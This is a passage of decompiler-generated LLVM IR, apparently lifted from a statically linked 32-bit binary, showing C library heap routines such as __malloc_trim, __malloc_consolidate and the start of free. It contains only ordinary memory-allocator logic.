  %tmp16 = icmp ult i32 %v0_8052e4c, 7
  br i1 %tmp16, label %dec_label_pc_8052e72, label %dec_label_pc_8052e51

dec_label_pc_8052e51:                             ; preds = %dec_label_pc_8052e3e
  %v0_8052e51 = load i32, i32* @ebx, align 4
  %v1_8052e51 = add i32 %v0_8052e51, 20
  %v2_8052e51 = inttoptr i32 %v1_8052e51 to i32*
  store i32 0, i32* %v2_8052e51, align 4
  %v0_8052e58 = load i32, i32* @ebx, align 4
  %v1_8052e58 = add i32 %v0_8052e58, 24
  %v2_8052e58 = inttoptr i32 %v1_8052e58 to i32*
  store i32 0, i32* %v2_8052e58, align 4
  %v0_8052e5f = load i32, i32* %eax.global-to-local, align 4
  %tmp17 = icmp ult i32 %v0_8052e5f, 9
  br i1 %tmp17, label %dec_label_pc_8052e72, label %dec_label_pc_8052e64

dec_label_pc_8052e64:                             ; preds = %dec_label_pc_8052e51
  %v0_8052e64 = load i32, i32* @ebx, align 4
  %v1_8052e64 = add i32 %v0_8052e64, 28
  %v2_8052e64 = inttoptr i32 %v1_8052e64 to i32*
  store i32 0, i32* %v2_8052e64, align 4
  %v0_8052e6b = load i32, i32* @ebx, align 4
  %v1_8052e6b = add i32 %v0_8052e6b, 32
  %v2_8052e6b = inttoptr i32 %v1_8052e6b to i32*
  store i32 0, i32* %v2_8052e6b, align 4
  br label %dec_label_pc_8052e72

dec_label_pc_8052e72:                             ; preds = %dec_label_pc_8052e51, %dec_label_pc_8052e3e, %dec_label_pc_8052e25, %dec_label_pc_8052dff, %dec_label_pc_8052dcd, %dec_label_pc_8052e16, %dec_label_pc_8052e64
  store i32 %v12_8052d9b, i32* %eax.global-to-local, align 4
  %v3_8052e7b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-28, i32 1)
  store i32 %v3_8052e7b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052e83

dec_label_pc_8052e83:                             ; preds = %dec_label_pc_8052dbb, %dec_label_pc_8052e72
  %v0_8052e86 = load i32, i32* @ebx, align 4
  store i32 %v0_8052e86, i32* %eax.global-to-local, align 4
  store i32 %v0_8052d9a, i32* @ebx, align 4
  store i32 %v0_8052d98, i32* @edi, align 4
  ret i32 %v0_8052e86

; uselistorder directives
  uselistorder i32 %v1_8052e09, { 2, 1, 0 }
  uselistorder i32 %v1_8052df1, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 4, 5, 6, 3, 7, 8, 9, 10, 11, 12, 14, 13 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052e83, { 1, 0 }
  uselistorder label %dec_label_pc_8052e72, { 6, 0, 1, 2, 5, 3, 4 }
}

define i32 @__malloc_trim() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_8052e8f = load i32, i32* @ebx, align 4
  %v0_8052e93 = load i32, i32* @edx, align 4
  store i32 %v0_8052e93, i32* %ebp.global-to-local, align 4
  %v1_8052e95 = add i32 %v0_8052e93, 860
  %v2_8052e95 = inttoptr i32 %v1_8052e95 to i32*
  %v3_8052e95 = load i32, i32* %v2_8052e95, align 4
  store i32 %v3_8052e95, i32* @ecx, align 4
  %v1_8052e9b = add i32 %v0_8052e93, 44
  %v2_8052e9b = inttoptr i32 %v1_8052e9b to i32*
  %v3_8052e9b = load i32, i32* %v2_8052e9b, align 4
  %v1_8052e9e = add i32 %v3_8052e9b, 4
  %v2_8052e9e = inttoptr i32 %v1_8052e9e to i32*
  %v3_8052e9e = load i32, i32* %v2_8052e9e, align 4
  %v1_8052ea1 = and i32 %v3_8052e9e, -4
  store i32 %v1_8052ea1, i32* @esi, align 4
  %v1_8052ea6 = load i32, i32* @eax, align 4
  %v2_8052ea6 = add i32 %v3_8052e95, -17
  %v2_8052ea8 = add i32 %v2_8052ea6, %v1_8052ea1
  %v3_8052ea8 = sub i32 %v2_8052ea8, %v1_8052ea6
  %div = udiv i32 %v3_8052ea8, %v3_8052e95
  store i32 %div, i32* %eax.global-to-local, align 4
  %v1_8052eb0 = add i32 %div, -1
  %v4_8052eb3 = mul i32 %v1_8052eb0, %v3_8052e95
  store i32 %v4_8052eb3, i32* @ebx, align 4
  %tmp11 = icmp slt i32 %v4_8052eb3, 1
  br i1 %tmp11, label %dec_label_pc_8052f0f, label %dec_label_pc_8052eba

dec_label_pc_8052eba:                             ; preds = %entry
  %v1_8052ebf = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052ebf, i32* %edi.global-to-local, align 4
  %v0_8052ec6 = load i32, i32* @esi, align 4
  store i32 %v0_8052ec6, i32* %eax.global-to-local, align 4
  %v1_8052ec8 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8052ec8 = add i32 %v1_8052ec8, 44
  %v3_8052ec8 = inttoptr i32 %v2_8052ec8 to i32*
  %v4_8052ec8 = load i32, i32* %v3_8052ec8, align 4
  %v5_8052ec8 = add i32 %v4_8052ec8, %v0_8052ec6
  store i32 %v5_8052ec8, i32* %eax.global-to-local, align 4
  %v12_8052ece = icmp eq i32 %v1_8052ebf, %v5_8052ec8
  %v1_8052ed0 = icmp eq i1 %v12_8052ece, false
  br i1 %v1_8052ed0, label %dec_label_pc_8052f0f, label %dec_label_pc_8052ed2

dec_label_pc_8052ed2:                             ; preds = %dec_label_pc_8052eba
  %v1_8052ed5 = sub i32 0, %v4_8052eb3
  store i32 %v1_8052ed5, i32* @ebx, align 4
  %v1_8052ed8 = call i32 @__GI_sbrk(i32 %v1_8052ed5)
  store i32 %v1_8052ed8, i32* %eax.global-to-local, align 4
  %v1_8052ee4 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_8052ee4, i32* %eax.global-to-local, align 4
  %v10_8052eec = icmp eq i32 %v1_8052ee4, -1
  br i1 %v10_8052eec, label %dec_label_pc_8052f0f, label %dec_label_pc_8052ef1

dec_label_pc_8052ef1:                             ; preds = %dec_label_pc_8052ed2
  %v0_8052ef1 = load i32, i32* %edi.global-to-local, align 4
  %v2_8052ef3 = sub i32 %v0_8052ef1, %v1_8052ee4
  %v12_8052ef3 = icmp eq i32 %v2_8052ef3, 0
  store i32 %v2_8052ef3, i32* @ecx, align 4
  br i1 %v12_8052ef3, label %dec_label_pc_8052f0f, label %dec_label_pc_8052ef7

dec_label_pc_8052ef7:                             ; preds = %dec_label_pc_8052ef1
  %v0_8052ef7 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052ef7 = add i32 %v0_8052ef7, 44
  %v2_8052ef7 = inttoptr i32 %v1_8052ef7 to i32*
  %v3_8052ef7 = load i32, i32* %v2_8052ef7, align 4
  store i32 %v3_8052ef7, i32* %eax.global-to-local, align 4
  %v1_8052efa = add i32 %v0_8052ef7, 872
  %v2_8052efa = inttoptr i32 %v1_8052efa to i32*
  %v3_8052efa = load i32, i32* %v2_8052efa, align 4
  %v5_8052efa = sub i32 %v3_8052efa, %v2_8052ef3
  store i32 %v5_8052efa, i32* %v2_8052efa, align 4
  %v0_8052f00 = load i32, i32* @esi, align 4
  %v1_8052f00 = load i32, i32* @ecx, align 4
  %v2_8052f00 = sub i32 %v0_8052f00, %v1_8052f00
  %v1_8052f02 = or i32 %v2_8052f00, 1
  %v1_8052f05 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052f05 = add i32 %v1_8052f05, 4
  %v3_8052f05 = inttoptr i32 %v2_8052f05 to i32*
  store i32 %v1_8052f02, i32* %v3_8052f05, align 4
  br label %dec_label_pc_8052f11

dec_label_pc_8052f0f:                             ; preds = %dec_label_pc_8052ef1, %dec_label_pc_8052ed2, %dec_label_pc_8052eba, %entry
  br label %dec_label_pc_8052f11

dec_label_pc_8052f11:                             ; preds = %dec_label_pc_8052ef7, %dec_label_pc_8052f0f
  %storemerge = phi i32 [ 1, %dec_label_pc_8052ef7 ], [ 0, %dec_label_pc_8052f0f ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_8052e8f, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_8052ee4, { 1, 0, 2 }
  uselistorder i32 %v4_8052eb3, { 1, 2, 0 }
  uselistorder i32 %v3_8052e95, { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_8052f11, { 1, 0 }
}

define i32 @__malloc_consolidate(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = ptrtoint i32* %arg1 to i32
  %v0_8052f19 = load i32, i32* @ebp, align 4
  %v0_8052f1a = load i32, i32* @edi, align 4
  %v0_8052f1b = load i32, i32* @esi, align 4
  %v0_8052f1c = load i32, i32* @ebx, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8052f24 = load i32, i32* %arg1, align 4
  store i32 %v2_8052f24, i32* %eax.global-to-local, align 4
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8052f2b = icmp eq i32 %v2_8052f24, 0
  br i1 %v1_8052f2b, label %dec_label_pc_8053054.preheader, label %dec_label_pc_8052f33

dec_label_pc_8053054.preheader:                   ; preds = %entry
  %v3_8053049 = add i32 %tmp11, 44
  br label %dec_label_pc_8053045

dec_label_pc_8052f33:                             ; preds = %entry
  %v1_8052f37 = and i32 %v2_8052f24, -3
  store i32 %v1_8052f37, i32* %arg1, align 4
  %v1_8052f3c = add i32 %tmp11, 52
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8052f58 = udiv i32 %v1_8052f37, 8
  %v2_8052f5b = mul nuw i32 %v2_8052f58, 4
  %v3_8052f5b = add i32 %tmp11, -4
  %v4_8052f5b = add i32 %v3_8052f5b, %v2_8052f5b
  store i32 %v4_8052f5b, i32* %eax.global-to-local, align 4
  %v2_8053022 = add i32 %tmp11, 44
  %v3_8053022 = inttoptr i32 %v2_8053022 to i32*
  %v1_8052ff5 = add i32 %tmp11, 60
  %v2_8052ff5 = inttoptr i32 %v1_8052ff5 to i32*
  br label %dec_label_pc_8052f63

dec_label_pc_8052f63:                             ; preds = %dec_label_pc_805303b, %dec_label_pc_8052f33
  %v0_8052f71.in = phi i32 [ %tmp11, %dec_label_pc_8052f33 ], [ %v0_8052f71, %dec_label_pc_805303b ]
  %v0_8052f71 = add i32 %v0_8052f71.in, 4
  store i32 %v0_8052f71, i32* %eax.global-to-local, align 4
  %v1_8052f67 = inttoptr i32 %v0_8052f71 to i32*
  %v2_8052f67 = load i32, i32* %v1_8052f67, align 4
  store i32 %v2_8052f67, i32* @ecx, align 4
  %v1_8052f69 = icmp eq i32 %v2_8052f67, 0
  br i1 %v1_8052f69, label %dec_label_pc_8053031, label %dec_label_pc_8052f71

dec_label_pc_8052f71:                             ; preds = %dec_label_pc_8052f63
  store i32 0, i32* %v1_8052f67, align 4
  %v0_8052f77.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052f77

dec_label_pc_8052f77:                             ; preds = %dec_label_pc_8053025, %dec_label_pc_8052f71
  %v0_8052f94 = phi i32 [ %v3_8052f77, %dec_label_pc_8053025 ], [ %v0_8052f77.pre, %dec_label_pc_8052f71 ]
  %v1_8052f77 = add i32 %v0_8052f94, 8
  %v2_8052f77 = inttoptr i32 %v1_8052f77 to i32*
  %v3_8052f77 = load i32, i32* %v2_8052f77, align 4
  store i32 %v3_8052f77, i32* %edx.global-to-local, align 4
  %v1_8052f7e = add i32 %v0_8052f94, 4
  %v2_8052f7e = inttoptr i32 %v1_8052f7e to i32*
  %v3_8052f7e = load i32, i32* %v2_8052f7e, align 4
  store i32 %v3_8052f7e, i32* %eax.global-to-local, align 4
  %v1_8052f83 = and i32 %v3_8052f7e, -2
  store i32 %v1_8052f83, i32* @edi, align 4
  %v2_8052f86 = urem i32 %v3_8052f7e, 2
  %v3_8052f86 = icmp eq i32 %v2_8052f86, 0
  %v2_8052f88 = add i32 %v1_8052f83, %v0_8052f94
  store i32 %v2_8052f88, i32* @ebx, align 4
  %v1_8052f8b = add i32 %v2_8052f88, 4
  %v2_8052f8b = inttoptr i32 %v1_8052f8b to i32*
  %v3_8052f8b = load i32, i32* %v2_8052f8b, align 4
  store i32 %v3_8052f8b, i32* %edx.global-to-local, align 4
  %v1_8052f92 = icmp eq i1 %v3_8052f86, false
  br i1 %v1_8052f92, label %dec_label_pc_8052fb4, label %dec_label_pc_8052f94

dec_label_pc_8052f94:                             ; preds = %dec_label_pc_8052f77
  %v1_8052f94 = inttoptr i32 %v0_8052f94 to i32*
  %v2_8052f94 = load i32, i32* %v1_8052f94, align 4
  store i32 %v2_8052f94, i32* @ebp, align 4
  %v2_8052f98 = sub i32 %v0_8052f94, %v2_8052f94
  store i32 %v2_8052f98, i32* %eax.global-to-local, align 4
  %v1_8052f9a = add i32 %v2_8052f98, 8
  %v2_8052f9a = inttoptr i32 %v1_8052f9a to i32*
  %v3_8052f9a = load i32, i32* %v2_8052f9a, align 4
  store i32 %v3_8052f9a, i32* @esi, align 4
  %v1_8052f9d = add i32 %v2_8052f98, 12
  %v2_8052f9d = inttoptr i32 %v1_8052f9d to i32*
  %v3_8052f9d = load i32, i32* %v2_8052f9d, align 4
  store i32 %v3_8052f9d, i32* %edx.global-to-local, align 4
  %v1_8052fa0 = add i32 %v3_8052f9a, 12
  %v2_8052fa0 = inttoptr i32 %v1_8052fa0 to i32*
  %v3_8052fa0 = load i32, i32* %v2_8052fa0, align 4
  store i32 %v3_8052fa0, i32* @ecx, align 4
  %v12_8052fa3 = icmp eq i32 %v3_8052fa0, %v2_8052f98
  %v1_8052fa5 = icmp eq i1 %v12_8052fa3, false
  br i1 %v1_8052fa5, label %dec_label_pc_8052fe4, label %dec_label_pc_8052fa7

dec_label_pc_8052fa7:                             ; preds = %dec_label_pc_8052f94
  %v1_8052fa7 = add i32 %v3_8052f9d, 8
  %v2_8052fa7 = inttoptr i32 %v1_8052fa7 to i32*
  %v3_8052fa7 = load i32, i32* %v2_8052fa7, align 4
  %v15_8052fa7 = icmp eq i32 %v3_8052fa7, %v3_8052fa0
  %v1_8052faa = icmp eq i1 %v15_8052fa7, false
  br i1 %v1_8052faa, label %dec_label_pc_8052fe4, label %dec_label_pc_8052fac

dec_label_pc_8052fac:                             ; preds = %dec_label_pc_8052fa7
  %v2_8052fac = add i32 %v2_8052f94, %v1_8052f83
  store i32 %v2_8052fac, i32* @edi, align 4
  store i32 %v3_8052f9d, i32* %v2_8052fa0, align 4
  %v0_8052fb1 = load i32, i32* @esi, align 4
  %v1_8052fb1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8052fb1 = add i32 %v1_8052fb1, 8
  %v3_8052fb1 = inttoptr i32 %v2_8052fb1 to i32*
  store i32 %v0_8052fb1, i32* %v3_8052fb1, align 4
  %v0_8052fbf.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052fb4

dec_label_pc_8052fb4:                             ; preds = %dec_label_pc_8052f77, %dec_label_pc_8052fac
  %v1_8052fc8 = phi i32 [ %v2_8052f88, %dec_label_pc_8052f77 ], [ %v0_8052fbf.pre, %dec_label_pc_8052fac ]
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8052fbc = and i32 %v3_8052f8b, -4
  store i32 %v1_8052fbc, i32* @ebp, align 4
  %v4_8052fbf = load i32, i32* %v3_8053022, align 4
  %v15_8052fbf = icmp eq i32 %v1_8052fc8, %v4_8052fbf
  br i1 %v15_8052fbf, label %dec_label_pc_8053015, label %dec_label_pc_8052fc4

dec_label_pc_8052fc4:                             ; preds = %dec_label_pc_8052fb4
  %v2_8052fc4 = add i32 %v1_8052fc8, 4
  %v3_8052fc4 = add i32 %v2_8052fc4, %v1_8052fbc
  %v4_8052fc4 = inttoptr i32 %v3_8052fc4 to i32*
  %v5_8052fc4 = load i32, i32* %v4_8052fc4, align 4
  store i32 %v5_8052fc4, i32* %eax.global-to-local, align 4
  %v3_8052fc8 = inttoptr i32 %v2_8052fc4 to i32*
  store i32 %v1_8052fbc, i32* %v3_8052fc8, align 4
  %v0_8052fcb = load i32, i32* %eax.global-to-local, align 4
  %v1_8052fcb = urem i32 %v0_8052fcb, 2
  %v2_8052fcb = icmp eq i32 %v1_8052fcb, 0
  store i32 %v1_8052fcb, i32* %eax.global-to-local, align 4
  %v1_8052fd0 = icmp eq i1 %v2_8052fcb, false
  br i1 %v1_8052fd0, label %dec_label_pc_8052ff1, label %dec_label_pc_8052fd2

dec_label_pc_8052fd2:                             ; preds = %dec_label_pc_8052fc4
  %v0_8052fd2 = load i32, i32* @ebx, align 4
  %v1_8052fd2 = add i32 %v0_8052fd2, 8
  %v2_8052fd2 = inttoptr i32 %v1_8052fd2 to i32*
  %v3_8052fd2 = load i32, i32* %v2_8052fd2, align 4
  store i32 %v3_8052fd2, i32* @edx, align 4
  %v1_8052fd5 = add i32 %v0_8052fd2, 12
  %v2_8052fd5 = inttoptr i32 %v1_8052fd5 to i32*
  %v3_8052fd5 = load i32, i32* %v2_8052fd5, align 4
  store i32 %v3_8052fd5, i32* %eax.global-to-local, align 4
  %v1_8052fd8 = add i32 %v3_8052fd2, 12
  %v2_8052fd8 = inttoptr i32 %v1_8052fd8 to i32*
  %v3_8052fd8 = load i32, i32* %v2_8052fd8, align 4
  store i32 %v3_8052fd8, i32* @esi, align 4
  %v12_8052fdb = icmp eq i32 %v3_8052fd8, %v0_8052fd2
  %v1_8052fdd = icmp eq i1 %v12_8052fdb, false
  br i1 %v1_8052fdd, label %dec_label_pc_8052fe4, label %dec_label_pc_8052fdf

dec_label_pc_8052fdf:                             ; preds = %dec_label_pc_8052fd2
  %v1_8052fdf = add i32 %v3_8052fd5, 8
  %v2_8052fdf = inttoptr i32 %v1_8052fdf to i32*
  %v3_8052fdf = load i32, i32* %v2_8052fdf, align 4
  %v15_8052fdf = icmp eq i32 %v3_8052fdf, %v3_8052fd8
  br i1 %v15_8052fdf, label %dec_label_pc_8052fe9, label %dec_label_pc_8052fe4

dec_label_pc_8052fe4:                             ; preds = %dec_label_pc_8052fdf, %dec_label_pc_8052fd2, %dec_label_pc_8052fa7, %dec_label_pc_8052f94
  %v0_8052fe4 = call i32 @abort()
  store i32 %v0_8052fe4, i32* %eax.global-to-local, align 4
  %v1_8052feb.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052fe9

dec_label_pc_8052fe9:                             ; preds = %dec_label_pc_8052fdf, %dec_label_pc_8052fe4
  %v1_8052feb = phi i32 [ %v3_8052fd2, %dec_label_pc_8052fdf ], [ %v1_8052feb.pre, %dec_label_pc_8052fe4 ]
  %v0_8052feb = phi i32 [ %v3_8052fd5, %dec_label_pc_8052fdf ], [ %v0_8052fe4, %dec_label_pc_8052fe4 ]
  %v0_8052fe9 = load i32, i32* @edi, align 4
  %v1_8052fe9 = load i32, i32* @ebp, align 4
  %v2_8052fe9 = add i32 %v1_8052fe9, %v0_8052fe9
  store i32 %v2_8052fe9, i32* @edi, align 4
  %v2_8052feb = add i32 %v1_8052feb, 12
  %v3_8052feb = inttoptr i32 %v2_8052feb to i32*
  store i32 %v0_8052feb, i32* %v3_8052feb, align 4
  %v0_8052fee = load i32, i32* @edx, align 4
  %v1_8052fee = load i32, i32* %eax.global-to-local, align 4
  %v2_8052fee = add i32 %v1_8052fee, 8
  %v3_8052fee = inttoptr i32 %v2_8052fee to i32*
  store i32 %v0_8052fee, i32* %v3_8052fee, align 4
  br label %dec_label_pc_8052ff1

dec_label_pc_8052ff1:                             ; preds = %dec_label_pc_8052fc4, %dec_label_pc_8052fe9
  store i32 %v1_8052f3c, i32* %eax.global-to-local, align 4
  %v3_8052ff5 = load i32, i32* %v2_8052ff5, align 4
  store i32 %v3_8052ff5, i32* %edx.global-to-local, align 4
  %v0_8052ff8 = load i32, i32* @ecx, align 4
  store i32 %v0_8052ff8, i32* %v2_8052ff5, align 4
  %v0_8052ffb = load i32, i32* @edi, align 4
  %v1_8052ffd = or i32 %v0_8052ffb, 1
  store i32 %v1_8052ffd, i32* %eax.global-to-local, align 4
  %v0_8053000 = load i32, i32* @ecx, align 4
  %v1_8053000 = load i32, i32* %edx.global-to-local, align 4
  %v2_8053000 = add i32 %v1_8053000, 12
  %v3_8053000 = inttoptr i32 %v2_8053000 to i32*
  store i32 %v0_8053000, i32* %v3_8053000, align 4
  %v0_8053003 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053003 = load i32, i32* @ecx, align 4
  %v2_8053003 = add i32 %v1_8053003, 4
  %v3_8053003 = inttoptr i32 %v2_8053003 to i32*
  store i32 %v0_8053003, i32* %v3_8053003, align 4
  store i32 %v1_8052f3c, i32* %eax.global-to-local, align 4
  %v0_805300a = load i32, i32* %edx.global-to-local, align 4
  %v1_805300a = load i32, i32* @ecx, align 4
  %v2_805300a = add i32 %v1_805300a, 8
  %v3_805300a = inttoptr i32 %v2_805300a to i32*
  store i32 %v0_805300a, i32* %v3_805300a, align 4
  %v0_805300d = load i32, i32* %eax.global-to-local, align 4
  %v1_805300d = load i32, i32* @ecx, align 4
  %v2_805300d = add i32 %v1_805300d, 12
  %v3_805300d = inttoptr i32 %v2_805300d to i32*
  store i32 %v0_805300d, i32* %v3_805300d, align 4
  %v0_8053010 = load i32, i32* @edi, align 4
  %v1_8053010 = load i32, i32* @ecx, align 4
  %v3_8053010 = add i32 %v1_8053010, %v0_8053010
  %v4_8053010 = inttoptr i32 %v3_8053010 to i32*
  store i32 %v0_8053010, i32* %v4_8053010, align 4
  br label %dec_label_pc_8053025

dec_label_pc_8053015:                             ; preds = %dec_label_pc_8052fb4
  %v0_8053015 = load i32, i32* @edi, align 4
  %v2_8053015 = add i32 %v0_8053015, %v1_8052fbc
  %v1_8053018 = or i32 %v2_8053015, 1
  store i32 %v1_8053018, i32* %eax.global-to-local, align 4
  %v1_805301b = load i32, i32* @ecx, align 4
  %v2_805301b = add i32 %v1_805301b, 4
  %v3_805301b = inttoptr i32 %v2_805301b to i32*
  store i32 %v1_8053018, i32* %v3_805301b, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v0_8053022 = load i32, i32* @ecx, align 4
  store i32 %v0_8053022, i32* %v3_8053022, align 4
  br label %dec_label_pc_8053025

dec_label_pc_8053025:                             ; preds = %dec_label_pc_8052ff1, %dec_label_pc_8053015
  store i32 %v3_8052f77, i32* @ecx, align 4
  %v1_8053029 = icmp eq i32 %v3_8052f77, 0
  %v1_805302b = icmp eq i1 %v1_8053029, false
  br i1 %v1_805302b, label %dec_label_pc_8052f77, label %dec_label_pc_8053031

dec_label_pc_8053031:                             ; preds = %dec_label_pc_8053025, %dec_label_pc_8052f63
  store i32 %v4_8052f5b, i32* @ecx, align 4
  %v15_8053035 = icmp eq i32 %v0_8052f71, %v4_8052f5b
  br i1 %v15_8053035, label %dec_label_pc_80530b9, label %dec_label_pc_805303b

dec_label_pc_805303b:                             ; preds = %dec_label_pc_8053031
  br label %dec_label_pc_8052f63

dec_label_pc_8053045:                             ; preds = %dec_label_pc_8053054.preheader, %dec_label_pc_8053045
  %v1_805304920 = phi i32 [ 1, %dec_label_pc_8053054.preheader ], [ %v0_8053054.pre, %dec_label_pc_8053045 ]
  %v2_8053049 = mul i32 %v1_805304920, 8
  %v4_8053049 = add i32 %v3_8053049, %v2_8053049
  store i32 %v4_8053049, i32* %eax.global-to-local, align 4
  %v1_805304d = add i32 %v1_805304920, 1
  store i32 %v1_805304d, i32* %edx.global-to-local, align 4
  %v2_805304e = add i32 %v4_8053049, 12
  %v3_805304e = inttoptr i32 %v2_805304e to i32*
  store i32 %v4_8053049, i32* %v3_805304e, align 4
  %v0_8053051 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053051 = add i32 %v0_8053051, 8
  %v3_8053051 = inttoptr i32 %v2_8053051 to i32*
  store i32 %v0_8053051, i32* %v3_8053051, align 4
  %v0_8053054.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8053057 = icmp sgt i32 %v0_8053054.pre, 95
  br i1 %v7_8053057, label %dec_label_pc_8053059, label %dec_label_pc_8053045

dec_label_pc_8053059:                             ; preds = %dec_label_pc_8053045
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_805305d = add i32 %tmp11, 864
  %v2_805305d = inttoptr i32 %v1_805305d to i32*
  %v3_805305d = load i32, i32* %v2_805305d, align 4
  %v4_805305d = or i32 %v3_805305d, 1
  store i32 %v4_805305d, i32* %v2_805305d, align 4
  %v0_8053064 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053064 = add i32 %v0_8053064, 840
  %v2_8053064 = inttoptr i32 %v1_8053064 to i32*
  store i32 0, i32* %v2_8053064, align 4
  %v0_805306e = load i32, i32* %eax.global-to-local, align 4
  %v1_805306e = add i32 %v0_805306e, 852
  %v2_805306e = inttoptr i32 %v1_805306e to i32*
  store i32 65536, i32* %v2_805306e, align 4
  %v0_8053078 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053078 = add i32 %v0_8053078, 844
  %v2_8053078 = inttoptr i32 %v1_8053078 to i32*
  store i32 262144, i32* %v2_8053078, align 4
  %v0_8053082 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053082 = add i32 %v0_8053082, 836
  %v2_8053082 = inttoptr i32 %v1_8053082 to i32*
  store i32 262144, i32* %v2_8053082, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v2_8053093 = load i32, i32* %arg1, align 4
  %v1_8053095 = urem i32 %v2_8053093, 4
  %v1_8053098 = or i32 %v1_8053095, 72
  store i32 %v1_8053098, i32* %arg1, align 4
  %v1_805309f = add i32 %tmp11, 52
  store i32 %v1_805309f, i32* %eax.global-to-local, align 4
  %v2_80530a2 = add i32 %tmp11, 44
  %v3_80530a2 = inttoptr i32 %v2_80530a2 to i32*
  store i32 %v1_805309f, i32* %v3_80530a2, align 4
  %v1_80530a7 = call i32 @sysconf(i32 30)
  store i32 %v1_80530a7, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_80530b3 = add i32 %tmp11, 860
  %v3_80530b3 = inttoptr i32 %v2_80530b3 to i32*
  store i32 %v1_80530a7, i32* %v3_80530b3, align 4
  br label %dec_label_pc_80530b9

dec_label_pc_80530b9:                             ; preds = %dec_label_pc_8053031, %dec_label_pc_8053059
  store i32 %v0_8052f1c, i32* @ebx, align 4
  store i32 %v0_8052f1b, i32* @esi, align 4
  store i32 %v0_8052f1a, i32* @edi, align 4
  store i32 %v0_8052f19, i32* @ebp, align 4
  %v0_80530c0 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_80530c0

; uselistorder directives
  uselistorder i32 %v0_8053051, { 1, 0 }
  uselistorder i32 %v0_8053010, { 1, 0 }
  uselistorder i32 %v1_8052fcb, { 1, 0 }
  uselistorder i32 %v2_8052fc4, { 1, 0 }
  uselistorder i32 %v1_8052fbc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8052fc8, { 1, 0 }
  uselistorder i32 %v3_8052f77, { 2, 1, 3, 0 }
  uselistorder i32 %v0_8052f94, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_8052f71, { 2, 0, 1, 3 }
  uselistorder i32* %v3_8053022, { 1, 0 }
  uselistorder i32 %v1_8052f3c, { 1, 0 }
  uselistorder i32 %tmp11, { 6, 16, 2, 1, 15, 13, 12, 10, 9, 0, 4, 11, 5, 8, 3, 14, 7 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_80530b9, { 1, 0 }
  uselistorder label %dec_label_pc_8053045, { 1, 0 }
  uselistorder label %dec_label_pc_8053025, { 1, 0 }
  uselistorder label %dec_label_pc_8052ff1, { 1, 0 }
  uselistorder label %dec_label_pc_8052fe9, { 1, 0 }
  uselistorder label %dec_label_pc_8052fb4, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_80530c1 = load i32, i32* @ebp, align 4
  %v0_80530c2 = load i32, i32* @edi, align 4
  %v0_80530c3 = load i32, i32* @esi, align 4
  %v0_80530c4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_80530cc = icmp eq i32 %arg1, 0
  br i1 %v1_80530cc, label %dec_label_pc_8053255, label %dec_label_pc_80530d4

dec_label_pc_80530d4:                             ; preds = %entry
  %v2_80530df = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80530df, i32* %eax.global-to-local, align 4
  %v4_80530e4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134540701, i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  store i32 %v4_80530e4, i32* %eax.global-to-local, align 4
  %v1_80530f0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8062910.167 to i32))
  %v1_80530f5 = add i32 %arg1, -8
  store i32 %v1_80530f5, i32* @ecx, align 4
  %v0_80530f8 = load i8, i8* @global_var_8067680.236, align 1
  %v1_80530f8 = sext i8 %v0_80530f8 to i32
  store i32 %v1_80530f8, i32* %eax.global-to-local, align 4
  %v1_8053100 = add i32 %arg1, -4
  %v2_8053100 = inttoptr i32 %v1_8053100 to i32*
  %v3_8053100 = load i32, i32* %v2_8053100, align 4
  store i32 %v3_8053100, i32* %edx.global-to-local, align 4
